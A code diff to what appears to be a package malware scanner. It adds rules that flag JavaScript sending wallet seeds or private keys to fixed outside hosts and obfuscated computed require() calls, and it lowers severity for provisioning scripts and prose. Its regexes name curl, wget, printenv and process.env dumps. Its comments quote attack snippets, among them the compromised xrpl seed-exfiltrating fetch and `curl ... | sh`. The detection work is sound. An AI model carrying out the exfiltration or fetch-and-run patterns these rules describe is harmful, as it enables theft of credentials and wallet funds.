@@ -370,7 +370,8 @@ class CapabilityDetector(BaseDetector):
         hits.extend(resolved)
         hits.extend(self._ast_rule_capabilities(content, candidates, unit.language))
         if unit.language == "python" and any(
-            h.capability in (Capability.EXECUTE, Capability.CREDENTIAL, Capability.DECODE)
+            h.capability
+            in (Capability.EXECUTE, Capability.CREDENTIAL, Capability.DECODE, Capability.PERSIST)
             or h.rule_id == "CAP.EGRESS.DNS_CONSTRUCTED.001"
             for h in hits
         ):
@@ -383,6 +384,8 @@ class CapabilityDetector(BaseDetector):
         hits.extend(self._embedded_capabilities(ctx, content, commands))
         hits.extend(self._destination_capabilities(content, unit.language))
         hits.extend(self._js_downloaded_and_run(content, unit.language))
+        hits.extend(self._js_wallet_secret_sent(content, unit.language))
+        hits.extend(self._js_computed_require(content, unit.language))
         hits.extend(ScriptFetchedThenEvaluated.hits(content, unit.language))
         # A truncated file is reported by the engine, which reads every file and so sees every
         # truncation; this detector returns early for some.
@@ -890,6 +893,119 @@ class CapabilityDetector(BaseDetector):
         {"CAP.JS.COMMAND_FETCH_RUN.001", "CAP.BAT.FETCH_EXEC.001", "CAP.SH.FETCH_EXEC.001"}
     )
 
+    #: Files a person runs to set up a machine, by name or extension: never imported, never run
+    #: by a package manager on someone else's behalf.
+    HAND_RUN_PROVISIONING_NAMES: ClassVar[frozenset[str]] = frozenset(
+        {"vagrantfile", "dockerfile", "containerfile"}
+    )
+    HAND_RUN_PROVISIONING_SUFFIXES: ClassVar[tuple[str, ...]] = (
+        ".sh",
+        ".bash",
+        ".zsh",
+        ".ksh",
+        ".ps1",
+        ".psm1",
+        ".bat",
+        ".cmd",
+        ".dockerfile",
+        ".patch",
+        ".diff",
+        ".nix",
+        ".tpl",
+        ".tmpl",
+        ".j2",
+        ".postinst",
+        ".preinst",
+        ".chroot",
+    )
+
+    #: Prose formats, by name: read by people and renderers, run by nothing.
+    PROSE_SUFFIXES: ClassVar[tuple[str, ...]] = (
+        ".md",
+        ".markdown",
+        ".mdx",
+        ".rst",
+        ".adoc",
+        ".asciidoc",
+        ".txt",
+        ".org",
+        ".textile",
+    )
+    PROSE_NAMES: ClassVar[tuple[str, ...]] = ("readme", "changelog", "contributing", "pkg-info")
+
+    @staticmethod
+    def _is_prose(path: str) -> bool:
+        name = path.rpartition("!")[2].rpartition("/")[2].lower()
+        if name.endswith(CapabilityDetector.PROSE_SUFFIXES):
+            return True
+        if name == "metadata" and ".dist-info/" in path.lower():
+            return True
+        stem = name.split(".", 1)[0]
+        return stem in CapabilityDetector.PROSE_NAMES and (
+            "." not in name or name.endswith(CapabilityDetector.PROSE_SUFFIXES)
+        )
+
+    #: The whole environment turned into data: what a client reading its own key never does.
+    _ENVIRONMENT_DUMP = re.compile(
+        rb"\$\(\s{0,4}(?:env|printenv|set)\s{0,4}\)|`\s{0,4}(?:env|printenv)\s{0,4}`|\bprintenv\b"
+        rb"|JSON\.stringify\(\s{0,4}process\.env\s{0,4}[,)]"
+        rb"|\b(?:str|repr|json\.dumps)\(\s{0,4}(?:dict\(\s{0,4})?os\.environ\b"
+    )
+
+    _RAW_IP_URL = re.compile(rb"(?i)\b(?:https?|wss?|tcp)://(?:\d{1,3}\.){3}\d{1,3}(?![\d.])")
+
+    @staticmethod
+    def _names_untrusted_destination(raw: bytes) -> bool:
+        """A paste site, tunnel, webhook catcher or interaction service, or a bare IPv4 URL."""
+        from cordon_scanner.intel.hosts import Destinations
+
+        if CapabilityDetector._RAW_IP_URL.search(raw):
+            return True
+        return (
+            Destinations.could_match(raw)
+            and Destinations.destination_matcher().search(raw) is not None
+        )
+
+    @staticmethod
+    def _is_hand_run_provisioning(path: str, language: str | None) -> bool:
+        name = path.rpartition("!")[2].rpartition("/")[2].lower()
+        return (
+            name in CapabilityDetector.HAND_RUN_PROVISIONING_NAMES
+            or name.startswith(("dockerfile.", "vagrantfile."))
+            or name.endswith(CapabilityDetector.HAND_RUN_PROVISIONING_SUFFIXES)
+            or language in ("shell", "powershell", "batch", "dockerfile")
+        )
+
+    #: A fetch on the same line as the persistence: `curl ... >> ~/.bashrc`, `wget -O
+    #: /etc/systemd/system/x.service`, a crontab line that runs a download.
+    _FETCH_VERB = re.compile(
+        rb"(?i)\b(?:curl|wget|Invoke-WebRequest|iwr|Invoke-RestMethod|irm|DownloadString|DownloadFile)\b"
+    )
+
+    #: A variable filled by a fetch: `body="$(curl ...)"`, `$r = Invoke-WebRequest ...`.
+    _FETCHED_VARIABLE = re.compile(
+        rb"(?im)^[ \t]{0,16}(?:export[ \t]{1,4}|local[ \t]{1,4})?\$?([A-Za-z_][A-Za-z0-9_]{0,40})"
+        rb"[ \t]{0,4}=[ \t]{0,4}[\"'(]{0,3}(?:\$\(|`)?[ \t]{0,4}(?:curl|wget|Invoke-WebRequest|iwr"
+        rb"|Invoke-RestMethod|irm)\b"
+    )
+
+    @staticmethod
+    def _persists_a_download(content: FileContent, hits: list[CapabilityHit]) -> bool:
+        """Whether a line that persists also fetches, or writes out a variable a fetch filled."""
+        raw = content.raw
+        fetched = {m.group(1) for m in CapabilityDetector._FETCHED_VARIABLE.finditer(raw)}
+        for hit in hits:
+            if hit.capability is not Capability.PERSIST:
+                continue
+            start = raw.rfind(b"\n", 0, hit.byte_start) + 1
+            end = raw.find(b"\n", hit.byte_end)
+            line = raw[start : end if end >= 0 else len(raw)]
+            if CapabilityDetector._FETCH_VERB.search(line):
+                return True
+            if any(re.search(rb"\$\{?" + re.escape(name) + rb"\b", line) for name in fetched):
+                return True
+        return False
+
     @staticmethod
     def _runs_a_downloaded_file(hits: list[CapabilityHit]) -> bool:
         return any(hit.rule_id in CapabilityDetector.DOWNLOAD_RUN_CONSTRUCTS for hit in hits)
@@ -914,6 +1030,12 @@ class CapabilityDetector(BaseDetector):
         command and its wiping prompt in its minified main bundle, which is the only place an
         extension's code is."""
         return {hit.rule_id for hit in hits} >= CapabilityDetector.AGENT_HIJACK_PARTS
+
+    @staticmethod
+    def _sends_a_wallet_secret(hits: list[CapabilityHit]) -> bool:
+        """Not lowered for sitting in a bundle: the compromised `xrpl` releases sent the seed from
+        `dist/` and from their browser build, which is the code a consumer runs."""
+        return any(hit.rule_id == "CAP.JS.WALLET_SECRET_SENT" for hit in hits)
 
     @staticmethod
     def _evaluates_a_literal_payload(content: FileContent) -> bool:
@@ -2265,6 +2387,111 @@ class CapabilityDetector(BaseDetector):
             ]
         return []
 
+    #: A request: `fetch(`, an `axios`/`got`/`needle`/`superagent`/`request` call, jQuery's.
+    _JS_REQUEST: ClassVar[re.Pattern[str]] = re.compile(
+        r"(?<![\w$.])(?:fetch|axios(?:\.\w{1,12})?|got(?:\.\w{1,12})?|needle(?:\.\w{1,12})?|"
+        r"superagent(?:\.\w{1,12})?|request(?:\.\w{1,12})?|\$\.(?:post|ajax))\s{0,4}\("
+    )
+    _JS_EXTERNAL_URL: ClassVar[re.Pattern[str]] = re.compile(
+        r"[\"'`]https?://(?!(?:localhost|127\.|0\.0\.0\.0|\[::1\]))[^\"'`\s/]{3,200}"
+    )
+    #: What a wallet is opened with. `seed` is a random seed as often as a wallet's, so it counts
+    #: only in a file that is about wallets (`_JS_WALLET_CONTEXT`).
+    _JS_WALLET_SECRET: ClassVar[re.Pattern[str]] = re.compile(
+        r"(?<![\w$\"'`-])(?P<name>mnemonic(?:Phrase)?|seedPhrase|secretPhrase|privateKey|privKey|"
+        r"private_key|secretKey|secret_key|walletSecret|seed)(?![\w$])(?!\s{0,4}[:(=])"
+    )
+    _JS_WALLET_CONTEXT: ClassVar[re.Pattern[str]] = re.compile(
+        r"\b(?:[Ww]allet|mnemonic|[Kk]eypair|fromSeed|deriveKeypair|bip39|bip32|ethers|xrpl|solana|"
+        r"web3)\b"
+    )
+
+    @classmethod
+    def _js_wallet_secret_sent(
+        cls, content: FileContent, language: str | None
+    ) -> list[CapabilityHit]:
+        """A wallet's secret handed to a request bound for a fixed outside address.
+
+        The compromised `xrpl` 4.2.1 (April 2025) did it in one call, on every wallet the library
+        opened: `fetch("https://<host>/xc", { method: "POST", headers: { "ad-referral": seed } })`.
+        A wallet library signs with the secret and sends what it signed; nothing it does needs the
+        mnemonic or the private key itself to leave the process. The secret has to be a value in
+        the request's arguments -- `{ seed: 1 }` names a field -- and the address a literal, not
+        the node the user configured (review 98).
+        """
+        if language not in ("javascript", "typescript"):
+            return []
+        text = content.text
+        if "http" not in text or cls._JS_WALLET_SECRET.search(text) is None:
+            return []
+        wallet_file = cls._JS_WALLET_CONTEXT.search(text) is not None
+        for request in cls._JS_REQUEST.finditer(text):
+            window = text[request.end() : request.end() + 600]
+            call = window.split(";\n", 1)[0]
+            if cls._JS_EXTERNAL_URL.match(call.lstrip()) is None:
+                continue
+            for secret in cls._JS_WALLET_SECRET.finditer(call):
+                if secret.group("name") == "seed" and not wallet_file:
+                    continue
+                start = len(text[: request.start()].encode("utf-8"))
+                return [
+                    CapabilityHit(
+                        capability=Capability.CREDENTIAL,
+                        rule_id="CAP.JS.WALLET_SECRET_SENT",
+                        byte_start=start,
+                        byte_end=start + len(request.group(0).encode("utf-8")),
+                        line=text.count("\n", 0, request.start()) + 1,
+                    )
+                ]
+        return []
+
+    _JS_REQUIRE_CALL: ClassVar[re.Pattern[str]] = re.compile(
+        r"(?<![\w$.])require\s{0,4}\(\s{0,4}(?P<decoder>[A-Za-z_$][\w$]{0,40})\s{0,4}\("
+    )
+    #: Helpers that legitimately compute what to load: a path, a resolver, a plugin finder.
+    _JS_LOADER_HELPER: ClassVar[re.Pattern[str]] = re.compile(
+        r"(?i)path|join|resolve|dir|file|module|plugin|config|load|locate|find|require|import|get"
+    )
+    _JS_DECODER_CALLS: ClassVar[int] = 10
+
+    @classmethod
+    def _js_computed_require(
+        cls, content: FileContent, language: str | None
+    ) -> list[CapabilityHit]:
+        """Modules required by names a local decoder produces: `require(_d([...]))`.
+
+        A string-array obfuscator hides every module name, so `require("https")` -- the egress
+        the composites need -- is never written. What is left is the shape: `require` handed the
+        result of a local function that the file calls many times. `@sbxapps/...` (2026) reads
+        cloud, SSH and npm credentials from its `preinstall` this way, with nine computed
+        requires through one decoder called 217 times (review 98). Recorded as
+        `dynamic_dispatch`, so the install-hook composite decides what it means; a path or a
+        plugin resolver (`require(path.join(...))`) is not a decoder.
+        """
+        if language not in ("javascript", "typescript"):
+            return []
+        text = content.text
+        if "require" not in text:
+            return []
+        for match in cls._JS_REQUIRE_CALL.finditer(text):
+            decoder = match.group("decoder")
+            if cls._JS_LOADER_HELPER.search(decoder):
+                continue
+            calls = len(re.findall(rf"(?<![\w$.]){re.escape(decoder)}\s{{0,4}}\(", text))
+            if calls < cls._JS_DECODER_CALLS:
+                continue
+            start = len(text[: match.start()].encode("utf-8"))
+            return [
+                CapabilityHit(
+                    capability=Capability.DYNAMIC_DISPATCH,
+                    rule_id="CAP.JS.COMPUTED_REQUIRE",
+                    byte_start=start,
+                    byte_end=start + len(match.group(0).encode("utf-8")),
+                    line=text.count("\n", 0, match.start()) + 1,
+                )
+            ]
+        return []
+
     @classmethod
     def _destination_capabilities(
         cls, content: FileContent, language: str | None = None
@@ -3394,6 +3621,41 @@ class CapabilityDetector(BaseDetector):
         # `_is_minified` and the obfuscated Python it excused.
         smuggled = any(hit.rule_id == "CAP.INVISIBLE_SMUGGLING.001" for hit in hits)
         if category is not Category.MALICIOUS and not smuggled:
+            hand_run_provisioning = (
+                Capability.PERSIST in matched
+                and not in_hook
+                and not ctx.in_ci_hook(content.path)
+                and not ctx.in_consumer_install(content.path)
+                and CapabilityDetector._is_hand_run_provisioning(content.path, unit.language)
+                # A skill's script is run by the agent whenever the skill is invoked.
+                and not CapabilityDetector._skill_script(content.path, ctx)
+                and not CapabilityDetector._persists_a_download(content, hits)
+            )
+            # The credential-egress-execution combination outside anything that runs on its own:
+            # a client reading its own key and calling its own service, a deploy script, the
+            # Maven wrapper. The composite's message already says it is "a combination to be
+            # aware of rather than evidence of anything"; in the long tail it was the only code
+            # warning on 259 of 11,005 benign units rescanned, while in 4,269 malware samples it
+            # blocked none alone (review 98). Recorded -- unless the file also names a
+            # destination nobody sends their own credentials to.
+            own_credential_client = (
+                compiled.rule.id == "SUSPECT.EXFIL.001"
+                and not in_hook
+                and not ctx.in_ci_hook(content.path)
+                and not ctx.in_consumer_install(content.path)
+                and not CapabilityDetector._skill_script(content.path, ctx)
+                and not SourcePaths.is_editor_extension(content.path)
+                and not CapabilityDetector._names_untrusted_destination(content.raw)
+                and not CapabilityDetector._ENVIRONMENT_DUMP.search(content.raw)
+            )
+            # A shell, PowerShell, Vagrant, Docker, Nix or patch file that enables a service,
+            # writes a unit or appends `export PATH=...` to `~/.bashrc` is provisioning a person
+            # runs, persisting configuration rather than anything it fetched. In the long tail
+            # that was 400 shell scripts among 769 benign units with this finding; in 4,269
+            # malware samples it sat in such a file once, beside rules that block it anyway --
+            # the malware's persistence is JavaScript, 564 samples (review 98). Recorded. What
+            # persists a download (`curl ... >> ~/.bashrc`, a cron entry running `wget`, a
+            # variable filled by `$(curl ...)` and appended to a profile) keeps its grade.
             if Capability.PERSIST in matched and SampleKinds.is_machine_provisioning(
                 content.raw, content.path
             ):
@@ -3414,6 +3676,14 @@ class CapabilityDetector(BaseDetector):
                 # finding to critical -- which is the case where writing somebody
                 # else's cron entry is the attack rather than the installation.
                 ceilinged = "a script that provisions a machine"
+                if hand_run_provisioning:
+                    ceiling = Severity.LOW
+            elif hand_run_provisioning:
+                ceilinged = "a provisioning script a person runs, persisting configuration"
+                ceiling = Severity.LOW
+            elif own_credential_client:
+                ceilinged = "code a person or a program calls, with no destination of concern"
+                ceiling = Severity.LOW
             elif (
                 compiled.rule.id == self.CREDENTIAL_STORE_RULE
                 and SampleKinds.names_authentication(content.path)
@@ -3432,9 +3702,18 @@ class CapabilityDetector(BaseDetector):
                 ceilinged = "test material"
             elif SourcePaths.is_documentation(content.path):
                 ceilinged = "documentation"
+                if CapabilityDetector._is_prose(content.path):
+                    # Prose, which nothing runs: a README's `curl ... | sh` is an instruction to
+                    # a person. In the long tail, documentation and Python package metadata were
+                    # 79 of 278 benign units warned by `SUSPECT.DROPPER.001` alone, and none of
+                    # 4,269 malware samples had a dropper finding in prose (review 98). A
+                    # file merely under `docs/` -- Sphinx's `conf.py` -- keeps the ceiling above.
+                    ceiling = Severity.LOW
             elif (
                 SourcePaths.is_build_tooling(content.path)
                 and Capability.FETCH_EXEC not in present
+                # Nor a wallet's secret sent out: a build that ships it, ships it.
+                and not CapabilityDetector._sends_a_wallet_secret(hits)
                 # A published npm package's `build/` and `bin/` are what runs, not what builds.
                 and not CapabilityDetector._shipped_output(content.path, ctx)
                 # Nor when it wipes the machine: a build script that deletes `$HOME` or `/`
@@ -3474,6 +3753,7 @@ class CapabilityDetector(BaseDetector):
                 and not CapabilityDetector._runs_a_downloaded_file(hits)
                 and not CapabilityDetector._evaluates_a_literal_payload(content)
                 and not CapabilityDetector._turns_an_agent_on_the_user(hits)
+                and not CapabilityDetector._sends_a_wallet_secret(hits)
             ):
                 # Not when the output downloads and runs in one construct. A bundle holds a
                 # module loader's decoder and evaluator by construction, which is what this
@@ -3497,6 +3777,7 @@ class CapabilityDetector(BaseDetector):
                 and not CapabilityDetector._runs_a_downloaded_file(hits)
                 and not CapabilityDetector._evaluates_a_literal_payload(content)
                 and not CapabilityDetector._turns_an_agent_on_the_user(hits)
+                and not CapabilityDetector._sends_a_wallet_secret(hits)
             ):
                 # The same exceptions as generated output, for the same reasons. The second
                 # matters most here: a long encoded payload is itself what makes a hand-written
